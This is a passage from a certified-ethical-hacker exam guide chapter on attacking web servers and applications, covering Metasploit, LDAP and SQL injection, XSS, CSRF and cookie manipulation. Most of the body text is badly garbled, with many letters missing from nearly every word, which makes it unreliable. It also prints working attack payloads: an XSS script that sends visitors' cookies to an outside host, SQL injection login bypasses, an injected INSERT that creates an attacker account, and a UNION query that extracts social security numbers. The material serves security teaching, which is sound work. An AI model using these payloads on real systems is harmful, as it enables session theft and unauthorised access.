ha’s why I’m covicd h fis IT scuiy gi was his dscda.

A guy askd m a whil back, “If I’m followig good scuiy picipls, how
is hackig v possibl?” H had ak ca of all h cazy dfaul passwods
ad sigs o his sysm. H had pachd i hooughly. H’d s up moioig
of boh wok affic ad fil igiy islf. H had do vyhig h could
possibly hik of scuiy-wis, ad h smugly old m ha hackig his box was
impossible. I h shad h aivé by sayig, “Cogaulaios. You’ igh.
Today. Jus mmb ha you will always hav o b igh vy oh day, oo—
ad I hav o b igh oly once.”

Tim is dfiily o h sid of h hack bcaus higs cosisly chag i
ou viual wold. Nw vulabiliis ad w ways aoud scuiy faus com

06-ch06.indd 254 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

255

ou vy sigl day, ad i’s—da, I say—a Sisypha ask o coiu moioig
fo, ad applyig, scuiy fixs o sysms. Th oly way w, o h scuiy sid,
ca wi? Sop pushig h bould a all ad jus uplug vyhig. Uil h, all
w ca do is g mo of us pushig ha ock up h hill—ad sombody o disac
Zus wh w g o h op.

Masploi (ioducd i Chap 5) will cov los of opios fo you, icludig
xploiaio of kow vulabiliis ad aackig passwods ov Tl, SSH, ad
HTTP. A basic Masploi xploi modul cosiss of fiv acios: slc h xploi you
wa o us, cofigu h vaious opios wihi h xploi, slc a ag, slc h
payload (ha is, wha you wa o xcu o h ag machi), ad h lauch h
xploi. Simply fid a wb sv wihi you ag sub, ad fi away!

NOTE I’m not saying YouTube videos always show the best, or even proper,
usage o any tool, but there are innumerable videos showing Metasploit in
action, and sometimes the best way to learn is just watching someone use
it. Speaking o ree training, check out https://www.oensive-security.com/
metasploit-unleashed/ and give the ree class/book a try. In act, type Learn
Metasploit in your avorite browser and make use o what’s out there.

You wo’ g askd a whol lo of i-dph qusios o Masploi, bu you do hav
o kow h basics of usig i ad som of wha maks i u. I’s calld a famwok fo
a aso—i’s a oolki ha allows fo xploi dvlopm ad sach. A high-lvl
ovviw of Masploi achicu is show i Figu 6-4. Th famwok bas accps
ipus fom cusom plug-is, ifacs (how you iac wih h famwok), scuiy

Custom plug-ins

Libraries

Interfaces REX
Modules

msfconsole Framework CORE Exploits

msfcli Payloads
Framework BASE

msfweb Encoders

msfwx NOPS

msfapi Auxiliary

Web services

Figure 6-4 Metasploit architecture

06-ch06.indd 255 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

256

ools, wb svics, ad moduls (ach wih is ow spcific pupos). Ud Moduls,
fo xampl, Explois would hold h acual xploi islf (which you ca play wih, al,
cofigu, ad capsula as you s fi), whil Payloads combis h abiay cod
xcud if h xploi is succssful. Auxiliay is usd o u o-off acios (lik a sca),
whil NOPS is usd maily fo buff-ovflow-yp opaios. REX, igh h i h
middl of h figu, is h libay fo mos asks, such as hadlig socks, poocols,
ad x asfomaios.

EXAM TIP Read up on Shellshock (aka Bashdoor). It’s not a web server
attack per se, but since many Internet-acing services and some web server
deployments use Bash to process certain requests, it’s worth mentioning
here. Shellshock works by causing Bash to unintentionally execute
commands when the commands are concatenated (usually via CGI) to the
end o unction deinitions stored in the values o environment variables.

Attacking Web Applications
Wb applicaios a aoh issu alogh, alhough may of h sam aacks ad
lis of asoig bld ov h fom h wb sv sid. As a ma of fac, a good
h quas of h official couswa chap dvod o wb applicaios is a a
wi of h wb sv chap. Howv, h is som good suff h you’ll d o
kow ad, as ayo who’s b o a p s am ov h pas fw yas o so will
as, you’ll pobably s as much succss ad as may suls fom you ffos agais
h wb applicaios hmslvs as you will agais ayhig ls.

A wb applicaio, i ms of you CEH xam, fills a impoa gap bw
h wbsi fo d ad h acual daabas pfomig h wok. Uss iac
wih h wbsi o affc daabas o oh dyamic co isacs, bu i’s h
wb app ha’s acually pfomig h magic. Wb applicaios a icasigly
bcomig a aack vco of choic, du i lag pa o hi sh umbs ad h
lack of sadadizaio acoss h boad. May wb apps a cad “i hous” by
h busiss ad, as a sul, usually hav vulabiliis buil i bcaus of a lack of
scuiy ovsigh duig hi caio. This scio is all abou h aacks you migh
s ad us i hackig wb applicaios.

Wb applicaios a mos of hackd bcaus of ih waksss buil io h
pogam a icpio. Dvlops migh ovlook kow vulabiliis, fog o pach
scuiy flaws, o lav dfaul passwods ad accous op fo xploiaio. A pai
hack ca scach away a h applicaio lookig fo hs vulabiliis, vually
fidig a way i. I’s obviously impossibl o cov vy sigl o of hs vulabiliis
ad h aacks ha wok o hm bcaus ach is dpd o h cicumsacs ad
h idividual applicaio. I his chap, w’ll jus coca ffos o a fw ad s
wh w g.

Idifyig y pois is a good plac o sa. Af all, if you ca figu ou wh h
applicaio is askig you fo ipu, you’ alady lookig a a way i. To accomplish his,
b su o xami cookis, hads, POST daa, ad codig o cypio masus.

06-ch06.indd 256 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

257

Ad fo goodss sak, do’ igo h obvious—h URL ca ll you a lo (ipu
paams ad such a of displayd h). Th a sval ools ha ca hlp i
idifyig you y pois, icludig WbScaab, hpi, ad Bup Sui.

Idifyig fucio ad chology o h sv sid hlps galy as wll. You
ca bows hough URLs ad occasioally g a good ida of sv makup, fom, ad
fucio. Fo xampl, cosid h followig URL:

hps://aybiz.com/ags.aspx?am=x%50clis&isAciv=0&iDa=20%2
F11%2F2012&sopDa=20%2F05%2F2013&showBy=am

Th plafom is show asily ough (aspx), ad w ca v s a coupl colum hads
fom h back-d daabas (iDa, sopDa, ad am). Eo mssags ad sssio
oks ca also povid valuabl ifomaio o sv-sid chology, if you’ payig
aio. A ally good way o g his do is mioig, which povids you wih all h
im you d o a local copy o chck higs ou. You wo’ b abl o g acual cod,
bu i will giv you im o figu ou h bs way io h al si fo fuu aalysis.

NOTE “Web 2.0” simply reers to a somewhat dierent method o creating
websites and applications: while 1.0 relies on static HTML, 2.0 uses “dynamic”
web pages. Because they’re dynamic in nature, 2.0 apps allow users to
upload and download to a site simultaneously, which provides much better
inrastructure or social media and other user participation eorts. Per ECC,
because Web 2.0 apps provide or more dynamic user participation, they
also oer more attack surace.

Application Attacks
As I said way back i Chap 1, ifomaio o CEH updas ad chags a lot, so
b ppad—you’ goig o d o pacic his suff as much as possibl, ad you’ll
pobably s o o wo w ims o you xam w may o hav v had of as of
his wiig. I’ll do h bs I ca o cov vyhig w kow abou oday, ad hop
ayhig w poppig up will b so vid you’ll com acoss i duig pacic ad
you ow sach. Thakfully, w hav a coupl higs goig fo us. Fis is, I kow wha
I’m doig (a las I hik I do) ad will g h lva ifomaio ou o you—o
o mio OWASP has os of f ifomaio o is wbsi fo us o viw o giv
aacks. Scod is, mos of his scio is vy simila o h ifomaio w covd o
wb sv aacks ad scuiy i h fis half of his chap. W’ll hi hs applicaio
aacks i apid-fi foma, so g ady!

Injection Attacks Not Named SQL
O succssful wb applicaio aack dals wih ijcig malicious commads io h
ipu sig. Th objciv is much lik ha of h paam-ampig mhods dis-
cussd ali i his chap: o pass xploi cod o h sv hough pooly dsigd
ipu validaio i h applicaio. This ca b accomplishd usig a vaiy of diff

06-ch06.indd 257 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

258

mhods, icludig file injection (wh h aack ijcs a poi i h wb fom
ipu o a xploi hosd o a mo si), command injection (wh h aack
ijcs commads io h fom filds isad of h xpcd s y), ad shell injec-
tion (wh h aack amps o gai shll accss usig Java o oh fucios).

LDAP injection is a aack ha xplois applicaios ha cosuc Lighwigh
Dicoy Accss Poocol (LDAP) sams basd o us ipu. To b mo spcific,
i xplois ovalidad wb ipu ha passs LDAP quis. I oh wods, if a wb
applicaio aks whav is d io h fom fild ad passs i dicly as a LDAP
quy, a aack ca ijc cod o do all kids of mischif. You’d hik his kid of
hig could v happ, bu you’d b supisd jus how lazy a lo of cods a.

Fo xampl, suppos a wb applicaio allows maags o pull ifomaio abou
hi pojcs ad mploys by loggig i, sig pmissios, ad povidig asws
o quis basd o hos pmissios. Maag Ma logs i vy moig o chck
o his folks by ig his us am ad passwod io wo boxs o a fom, ad his
logi is pasd io a LDAP quy (o valida who h is). Th LDAP quy would look
somhig lik

(&(USER=Matt)(PASSWORD=MyPwd!))

which basically says, “Chck o s whh h us am Ma machs h passwod
MyPwd! If i’s valid, logi is succssful ad off h gos.”

I a LDAP ijcio aack, h aack chags wha’s d io h fom fild
by addig h chaacs )(&) af h us am ad h povidig ay passwod
(s Figu 6-5). Bcaus h & symbol ds h quy, oly h fis pa—“chck o
s whh Ma is a valid us”—is pocssd ad, hfo, ay passwod will wok.
Th LDAP quy looks lik his i h aack:

(&(USER=Matt)(&)(PASSWORD=Anything))

Figure 6-5 Normal login:
LDAP injection

USERNAME: Matt

PASSWORD: ******

SUBMIT

LDAP injection login:

USERNAME: Matt)(&)

PASSWORD: *********

SUBMIT

06-ch06.indd 258 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

259

This basically says, “Chck o s whh you hav a us amd Ma. If h’s h,
cool—l’s jus l him do whav h was.” Whil h a a lo of oh higs you
ca do wih LDAP ijcio, I hik h poi is mad: do’ discou somhig v
his simpl, bcaus you v kow wha you’ll b abl o fid wih i.

EXAM TIP SOAP injection is a related attack. Simple Object Access Protocol
(SOAP) is designed to exchange structured inormation in web services in
computer networks and uses XML to ormat inormation. You can inject
malicious query strings (much like SQL injection) that may allow you to
bypass authentication and access databases behind the scenes. SOAP is
compatible with HTTP and SMTP, and messages are typically “one-way”
in nature.

Buffer Overflow
A buff ovflow aack is o ha should v b succssful i mod chology bu
sill mais a ga wapo i you asal bcaus of pooly dsigd applicaios. To
uly us his aack, you’ pobably goig o hav o bcom a good compu pogam-
m, which I’m su jus xcis you o o d. Th good ws o his, hough, is wo-
fold. Fis, may Masploi-lik ools mak h xcuio of kow ad sod buff
ovflow aacks asi fo you o amp (you’ll d oh ools o find buff ovflow
vulabiliis). Scod, you oly d o kow h basic mchaics of h aack fo
you CEH xam, ad i’s baly miod aymo. I h al wold, h bs hacks
a usually xcpioal pogamms—i’s jus a fac of lif. As fa as you xam is co-
cd, you d o kow oly a fw ims o succd.

NOTE Some buer overlow attacks are also reerred to as smashing the
stack. The name came rom a presentation that has become one o the
ounding documents o hacking, “Smashing the Stack or Fun and Proit,”
by Aleph One (or Phrack 49, way back in 1996). The original write-up can
be ound in numerous places with any Internet search engine (or example
http://phrack.org/issues/49/14.html#article) and is worth a read.

Th mos basic dfiiio of a buffer overflow is a amp o wi mo daa io a
applicaio’s pbuil buff aa i od o ovwi adjac mmoy, xcu cod, o
cash a sysm (applicaio). I sho, you ipu mo daa ha h buff is allocad
o hold. Th sul ca b ayhig fom cashig h applicaio o machi o alig
h applicaio’s daa pois, allowig you o u diff xcuabl cod. ECC usd
o hav sval cagois ad mmoizaio ms fo you i gad o buff ovflows
(lik sack, hap, NOP slds, ad so o), bu h CEH vsio 11 couswa dos’
sm o ca much abou i a all.

I addiio o good codig chiqus, o avoid allowig h ovflow i h fis
plac, somims dvlops ca us “caais” o “caay wods.” Th ida coms fom
h old coal miig days, wh caais w kp i cags i vaious placs i a mi.

06-ch06.indd 259 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

260

Th caay was mo suscpibl o poiso ai ad would, hfo, ac as a waig
o h mis. I buff ovflow ad pogammig palac, canary words a kow
valus placd bw h buff ad cool daa. If a buff ovflow occus, h caay
wod will b ald fis, iggig a hal o h sysm.

NOTE All o these are memory management attacks that take advantage
o how operating systems store inormation. While canary words are good
or test purposes, address space layout randomization (ASLR) and data
execution prevention (DEP) are extremely common mechanisms to ight
most o these attacks.

XSS
Th x wb applicaio/sv aack is cross-site scripting (XSS). This ca g a lil
cofusig, bu h basics of his aack volv aoud wbsi dsig, dyamic co-
, ad ivalidad ipu daa. Usually wh a wb fom pops up, h us ipus
somhig, ad h som scip dyamically chags h appaac o bhavio of h
wbsi basd o wha has b d. XSS occus wh h bad guys ak advaag
of ha scipig (JavaScip, fo isac) ad hav i pfom somhig oh ha h
idd spos.

Fo xampl, suppos isad of ig wha you’ supposd o  i a fom
fild, you  a acual scip. Th sv h dos wha i’s supposd o—i pocsss
h cod s fom a auhoizd us. Wham! Th aack jus ijcd malicious scip
wihi a lgiima qus ad…hack ciy.

EXAM TIP You’ll need to know what XSS is and what you can do with it. Also,
be able to recognize that a URL such as the ollowing is an indicator o an
XSS attempt: http://IPADDRESS/";!- -"<XSS>=&{()}. Instead o the URL passing
to an existing page/element internally, it passes to the script behind the
orward slash.

XSS amps pop up all ov h plac i sval fomas. O of h classic aacks
of XSS ivolvs gig accss o “docum.cooki” ad sdig i o a mo hos.
Suppos, fo xampl, you usd h followig i a fom fild y isad of povidig
you am:

&lt;script&gt;window.open&#40;&quot;http://somewhere.com/getcookie.acookie=&quot;
+ document.cookie&#41;&lt;/script&gt;

Should h app b vulabl o XSS, h Java scip d (covd o HTML
iis wh appopia—how fu!) will b u ad you ca obai cookis fom uss
accssig h pag la. Na!

XSS ca b usd o pfom all kids of badss o a ag sv. Ca you big a
ag dow wih a good old DoS aack? Why o? Ca I sd a XSS aack via -mail?
Of cous! How abou havig h ijcd scip mai pmaly o h ag sv
(lik i a daabas, mssag foum, visio log, o comm fild)? Plas—ha o
v has a am (stored XSS, aka persistent o Type-I XSS). I ca also b usd o upload

06-ch06.indd 260 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

261

malicious cod o uss cocd o h sv, o sd pop-up mssags o uss, ad
o sal viually ayhig. Tha PHP sssio ID ha idifis h us o h wbsi
sol hough a XSS? Wll, h aack has i ow ad ca masquad as h us all
day, pluggd io a sssio.

XSS aacks ca vay by applicaio ad by bows ad ca ag fom uisac o
sv impac, dpdig o wha h aack chooss o do. Thakfully, ECC dos’
bog dow h xam wih os of scipig kowldg. XSS qusios will b somwha
gal i au, alhough you will occasioally s a scaio-yp qusio ivolvig
a diagam ad a scip ipu.

CSRF
Cross-site request forgery (CSRF) is a fu aack ha focs a d us o xcu
uwad acios o a wb applicaio i which hy’ culy auhicad. Th
OWASP f documaio a o im had a cool xplaaio of his aack, so I
hough w’d sa h:

CSRF icks h vicim io submiig a malicious qus. I ihis h id-
iy ad pivilgs of h vicim o pfom a udsid fucio o h vicim’s
bhalf. Fo mos sis, bows quss auomaically iclud ay cdials asso-
ciad wih h si, such as h us’s sssio cooki, IP addss, Widows domai
cdials, ad so foh. Thfo, if h us is culy auhicad o h
si, h si will hav o way o disiguish bw h fogd qus s by h
vicim ad a lgiima qus s by h vicim. If h vicim is a omal us, a
succssful CSRF aack ca foc h us o pfom sa chagig quss lik
asfig fuds, chagig hi mail addss, ad so foh. If h vicim is a
admiisaiv accou, CSRF ca compomis h i wb applicaio.

EXAM TIP A session ixation attack is somewhat similar to CSRF. The attacker
logs in to a legitimate site and pulls a session ID, and then sends an e-mail
with a link containing the ixed session ID. When the user clicks it and logs in
to the same legitimate site, the hacker can now log in and run with the user’s
credentials.

Imagi if you addd a lil social giig o h mix. Jus sd a lik via -mail
o cha, ad—boom!—you ca ow ick h uss of a wb applicaio io xcuig
whav acios you choos. Chck ou Figu 6-6 fo a visual of CSRF i acio.

If you’ a scuiy-midd pso ad a wodig wha you ca do abou his,
lax—h asw is igh h. CSRF aacks ca b miigad by cofiguig a wb
sv o sd adom challg oks. If vy us qus icluds h challg
ok, i bcoms asy o spo illgiima quss o iiiad by h us.

Cookies
A cookie is a small x-basd fil ha is sod o you sysm fo us by h wb sv
h x im you log i. I ca coai ifomaio such as auhicaio dails, si
pfcs, shoppig ca cos, ad sssio dails. Cookis a s i h had
of a HTTP spos fom a wb sv ad may o may o hav a xpiaio da.

06-ch06.indd 261 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

262

Evil.net
3

Client visits
mailicious
website.

4 Requests sent using session ID from browser.

Session ID stored in
2

web browser cookie. Trusted Banking.com

1 Client logs into trusted site.

Figure 6-6 CSRF

Th oigial i was o povid a coiuous, sabl wb viw fo cusoms ad o
mak higs asi fo u sufs.

Th poblm, of cous, is ha smigly vyhig dsigd o mak ou
chological lif asi ca b co-opd fo vil. Cookis ca dfiily pov valuabl
o h hack, ad a ool such as h Cooki-Edio add-o fo Fifox ops up
paam-ampig oppouiis. Cookis hmslvs a’ xcuabl; hy’ jus
x fils, af all. Howv, hy ca b maipulad o us as spywa (cookis ca
b usd o ack compu aciviy), chag picig opios, ad v auhica o
a sv. Fo xampl, a y i a cooki adig ADMIN=o ca b chagd o
ADMIN=ys, hus povidig admiisaiv accss o si cools.

NOTE Ever heard o a CAPTCHA? O course you have—you’ve illed in
the little numbers and wavy gibberish veriying you’re a real person
beore. Did you know CAPTCHAs can be hijacked as well? CAPTCHAs can
manipulate all sorts o server-side nonsense when abused. As an aside, the
acronym actually stands or Completely Automated Public Turing test to
tell Computers and Humans Apart, which should be CAPTTCAHA, but was
shortened or some reason.

Passwods somims a sod i cookis, ad alhough i’s a hoibl pacic, i’s
sill faily pval. Accss o a ag’s physical machi ad h us of a ool o viw h
cookis sod o i (lik NiSof’s ChomCookisViw ad Fibok’s Cooki Viw)
migh giv you accss o passwods h us has fo vaious wbsis. Ad, if h us
is lik mos popl, i’s aly a guaa ha h passwod you jus lifd is big
usd o aoh si o accou. Addiioally, do’ b how off by cookis wih
log, smigly sslss x sigs bsid h us ID scios. O a fw, you may b
abl o u hm hough a Uicod (o Bas64) dcod o val h us’s passwod
fo ha si.

06-ch06.indd 262 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

263

SQL Injection
Bcaus SQL ijcio is such a impoa opic i h wold of hackig ad wb scu-
iy, w d o s som goud uls ad xpcaios fis. SQL ijcio is, by fa, h
mos commo ad mos succssful ijcio aack chiqu i h wold. Rmmb
OWASP’s Top 10? Ijcio is a h op of h lis, ad SQL ijcio is a h op of that
lis. I pops up aly vywh—h x big cdi cad hf soy you ad will, mos
likly, b bcaus of a SQL ijcio aack of som so. Ad, of cous, ECC ddicas
a i chap of official couswa sudy o h opic. All of which should lad you
o bliv, h, ha masig SQL is a skill you will wa o gai as a succssful hical
hack. Ad alhough ha is u, i’s o wha w’ goig o do h.

Bcomig a SQL mas is o wha his book is abou, o do I hav h spac o
im o cov vy fac of i—o v mos of facs, fo ha ma. As a ma of
fac, v ECC’s covag of h opic is lagly…pdsia i au. Th a los of
slids, wods, sampls, ad imags o b su, bu mos of i is piiv fo ims covd
lswh ad baly gazs h sufac of wha SQL is ad how o us i.

My job h is wofold. Pimaily i’s o hlp you pass h s, ad scodaily i’s o
assis you i bcomig a u hical hack. You’ goig o g h basics h—boh
fo you xam ad you ca—bu i’s goig o b jus ough o wh you appi.
If you ally wa o bcom a sasod mas, sudy SQL ad la all you ca abou
how i woks. As I’v said padly alady, a sigl book simply ca’ cov i all. You’ll
b a b hack, ad a b IT pofssioal all aoud, by doig a lil sach o
you ow ad pacicig. Now, o wih h show.

Sucud Quy Laguag (SQL) is a compu laguag dsigd fo maagig
daa i a laioal daabas sysm. Th laioal daabas is simply a collcio of
abls (cosisig of ows, which hold idividual filds coaiig daa) id ogh
usig som commo fild (ky) ha you ca upda ad quy. Each abl has a am
ha you fc wh you pfom quis o updas. SQL coms io play wh you
a addig, dlig, movig, updaig, o viwig h daa i hos abls ad filds.
Pfomig simpl asks i SQL is’ complicad, bu h SQL quis ca, vually,
g py complx.

NOTE SQL encompasses three standard areas o data handling—deinition
(Data Deinition Language, DDL), manipulation (Data Manipulation Language,
DML), and control (Data Control Language, DCL). Most SQL injections are
within the DML part o SQL.

Fo xampl, l’s cosid h SELECT commad. SELECT is usd o choos h
daa you’d lik o pfom a acio o. Th sam sas, amazigly ough, wih
h wod SELECT, followd by iumabl opios ad lms o dfi wha you
wa o ac upo ad wha ha acio will b. Fo xampl, a commad of

SELECT * FROM Orders;

says, “Daabas, I’d lik you o pull all cods fom h abl amd Ods.” Twakd a
lil, you ca g mo gaula. Fo xampl,

SELECT OrderID, FirstName, LastName FROM Orders;

06-ch06.indd 263 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

264

pulls vyhig i h od ID, fis am, ad las am colums fom h abl
amd Ods. Wh you sa addig oh commad opios such as WHERE (sig
up a codiioal sam), LIKE (dfiig a codiio wh somhig is simila o a
giv vaiabl), AND, ad OR (slf-xplaaoy), you ca g v cazi. Fo xampl,

SELECT OrderID, FirstName, LastName FROM Orders WHERE LastName = 'Walker';

pulls all ods mad by som dud wih h las am of Walk.
I addiio o SELECT, h a a buch of oh opios ad commads of

ga is o a hack. Fo xampl, ca you—wih o oh SQL xpic o
kowldg—figu ou wha h commad DROP TABLE tablename dos? Ay of
you who did’ spod wih “Dl h abl tablename fom h daabas” should
immdialy sa akig Gikoba o impov you cogiiv ad dduciv skills. How
abou h commads INSERT ad UPDATE? As you ca s, SQL is’ ock scic.
I is, hough, powful ad commads a lo of spc. Rsachig commad laguag
syax fo vyhig ha SQL offs will pay off dividds i you ca—us m
o his.

So, you kow a lil abou SQL daabass, ad hav a basic udsadig of how
o caf quy commads, bu h big qusio is, “So wha? Why is his so impoa?”
I asw, paus fo jus a mom ad cosid wh a daabas migh sid i a wb
sv/applicaio aa you’ yig o hack ad wha i’s h o do. Th fo d
aks ipu fom h us hough h wb sv ad passs i hough a applicaio o
fom o h daabas o acually adjus h daa. Ad wha, pay ll, is o his daabas?
Mayb ims such as cdi cad accou umbs, psoally idifiabl ifomaio
(PII), ad accou umbs ad passwods do’ is you, bu I pomis you ca fid
all of ha ad mo i a wb-svicd daabas.

NOTE Just so you know, the semicolon doesn’t necessarily have to be at the
end o every SQL statement, but some platorms reak out i it’s omitted. Add
it to be sae.

SQL injection occus wh h aack ijcs SQL quis dicly io h ipu
fom. Poply cosucd, h SQL commad bypasss h i of h fo d ad
xcus dicly o h SQL daabas. Fo xampl, cosid h sampl SQL show
i Figu 6-7. Th fom is cosucd o accp a us ID ad passwod fom h us.
Ths is a placd io a SQL quy ha says, “Plas compa h us am giv
o h passwod i is associad fild. If his us am machs his passwod, allow
accss.” Wha I ijcd chagd h oigial quy o say, “You ca compa whav
you’d lik, bu 1=1 is a u sam, so allow accss plas.”

NOTE You can also try SQL injection up in the URL itsel. For example, you
can try to pass authentication credentials by changing the URL to read
something like this: www.example.com/?login='OR 1=1- -.

06-ch06.indd 264 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

265

Figure 6-7
SQL injection

SQL query injected instead of user ID:
server reads it as a true statement
and allows access.

Of cous, kowig how SQL ijcio woks is’ ay good o you if you ca’ figu
ou whh h ag si is vulabl o SQL ijcio i h fis plac. To fid ou,
chck you ag fo a wb logi pag, ad isad of ig wha’s askd a h wb
fom, simply y a sigl quo (') ad s wha kid of o mssag, if ay, you civ.
If ha dos’ wok, y ig anything'or 1=1- ad s wha you g. If you civ
a o mssag lik h o show i Figu 6-8, you’ mo ha likly lookig a a
si vulabl o SQL ijcio.

Mos dvlops a familia wih his lil SQL “s,” ad lots of higs hav b
do o pv is us. May C++ ad .NET applicaios ow simply xplod wih os
wh hy a s a sigl quo (o som vaia hof ) ad oh spcial chaacs,
ad his ipu v v gs pocssd by h applicaio. Aoh ffo ivolvs h
so-calld magic quos i Apach, which fils ou (scap) h chaacs bfo h
applicaio v ss hm. Of cous, “fuzzig aack” ools such as Bup ca mak us
of h o mssagig o poi ou h udlyig poial vulabiliis o h sysm.

EXAM TIP Fuzz testing involves inputting bunches o random data into a
target (a site, an application, anything) to see what will happen. Designers
work on code or data inputs they expect a customer to input; however,
whether intentionally or not, input data not even close to what’s expected
may be ingested. While I mention it here in terms o SQL injection, uzzing is
used on tons o dierent stu.

Figure 6-8
SQL error
message

06-ch06.indd 265 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

266

To s SQL i acio, cosid a wbsi ha has a “Fogo you passwod? Click h
ad w’ll sd i o you” mssag. Af clickig h buo, you g a pop-up widow
askig you o is you -mail addss. You yp i i ad pss enter, ad you
passwod is -maild o you accou o fil. Wll, wha if you sd a SQL commad i
h fom isad ad ask h daabas o ca (INSERT) a w cod i h us ad
passwod abl jus fo you? Th commad

anything' ; INSERT INTO cust ('cust_Email', 'cust_Password', 'cust_Userid',
'cust_FirstName', 'cust_LastName') VALUES ( 'attacker_emailAddress@badplace.com',
'P@ssw0rd', 'Matt' , 'Matthew', 'Walker') ;—-

says o h daabas, “Daabas, you hav a abl h amd cus. I hik ha pobably
sads fo cusoms. So if you would, plas  io h filds labld Email, Passwod,
Usid, FisNam, ad LasNam hs w valus I’m supplyig fo you. Thak you,
ad hack ya la.”

Fo ha ma, if you’ a a si quiig logi, why o jus y bypassig h
auhicaio alogh? Ty loggig i usig SQL sams. Fo xampl,

admin '—- or admin ' /*

migh b bficial. You ca also y h old sadby

' or 1=1—-

o som vaiaio hof, such as

')

o

('1'='1- -

I ay cas, you ca fid buchs of hs yps of SQL sigs o y o h I.
O cauioay o, hough: bu-focig SQL his way is’ h quis mas of
gaiig accss. If you’ bagig away wih 10,000 vaiaios of a sigl op quo,
you’ goig o g oicd.

Th a os of SQL ijcio xampls ad jus as may ams giv fo h aacks.
W ca’ cov hm all h, bu EC-Coucil was kid ough o spli all of hm io
h mai cagois fo us:

• In-band SQL injection This is SQL ijcio wh h aack is usig h
sam commuicaio chal o pfom ad iv h suls of h aack.
This is h mos commoly usd yp. Exampls a Uio Quy aacks (h
UNION commad allows you o joi ogh SELECT quis; fo xampl,
SELECT fname,lname FROM users WHERE id=$id UNION ALL SELECT
socialsecuritynumber,1 FROM secretstuff; combis a laivly hamlss quy
wih o ha’s a lil mo…usful), o-basd (h objciv is o puposly
 pooly cosucd sams i a ffo o g h daabas o spod
wih abl ams ad oh ifomaio i is o mssags), auology (a ovly

06-ch06.indd 266 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

267

complx m usd o dscib h bhavio of a daabas sysm wh dcidig
whh a sam is u; bcaus us IDs ad passwods a of compad
ad h “u” masu allows accss, if you ick h daabas by povidig
somhig ha is alady u [1 dos, idd, qual 1], h you ca sak by),
ad d-of-li/ili comms.

• Out-of-band SQL injection Coay o i-bad, his yp of SQL ijcio
uss diff commuicaio chals fo h aack ad suls. I’s also mo
difficul o pull off.

• Blind/inferential This yp occus wh h aack kows h daabas is
suscpibl o ijcio, bu h o mssags ad sc us do’ com
back o h aack (o o mio suls a ofims Boola i u).
Bcaus his yp of SQL ijcio ivolvs a lo of gusswok ad ial ad o,
i aks a log whil o pull off.

EXAM TIP Another in-band attack is known as “piggybacking.” The idea is
simple—just add your malicious request on the back o a legitimate one.
Also, as an aside, please keep in mind that anything other than basic SQL will
have some signiicant semantic dierences, so always Google the database
version you’re trying.

As always, you ca pck aoud wih his suff ad la i maually, o you ca ak
advaag of ools alady cad o mak you job asi. Sqlmap ad sqlija a boh
auomad scas dsigd o look spcifically fo ijcio vulabiliis. Aoh
o I’v s i play is calld Havij, which allows umaio, cod xcuio o h
ag, fil sysm maipulaio, ad oh madss ov SQL cocios. SQLBu is
a ool ha allows you o blas hough pdfid SQL ijcio quis agais a ag.
Ohs ools iclud Pagoli, SQLExc, Absih, ad BobCa.

NOTE Protection against SQL injection usually comes down to security-
minded web and database design in the irst place. However, you can make
use o tools and signatures to at least monitor or attempts; or one example,
you can check the Snort signatures or prebuilt SQL rules and then block
or monitor or attempts using the signatures. Another good resource is
provided by OWASP: https://cheatsheetseries.owasp.org/cheatsheets/SQL_
Injection_Prevention_Cheat_Sheet.html.

HTTP Attack
Aoh a lil aack is calld HTTP response splitting. Th aack woks by addig
had spos daa o a ipu fild so ha h sv splis h spos i a coupl
dicios. If i woks, h aack cools h co of h scod had, which ca b
usd fo ay umb of higs, lik dicig h us o a malicious si h aack us.
OWASP calls HTTP spos spliig “a mas o a d, o a d i islf,” bcaus
h aack is dsigd o allow oh aacks (hough h scod had co) o wok.

06-ch06.indd 267 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

268

O fial hough o wb applicaio sig is ha i is’ acually a hack a all, bu i
su is poduciv. A commo mhod of scuiy sig (hackig) a wb applicaio is o
simply y usig i i a ma i which i was’ idd o b usd. This is’ applyig
som goovy hack ool o scipig cod o ijc hough som Jams Bod yp of
ploy; i’s jus yig diff higs wih a applicaio—somims v by accid. As
may a s will say, wih a chuckl i his voic, “I’s o a hack; i’s a feature.”

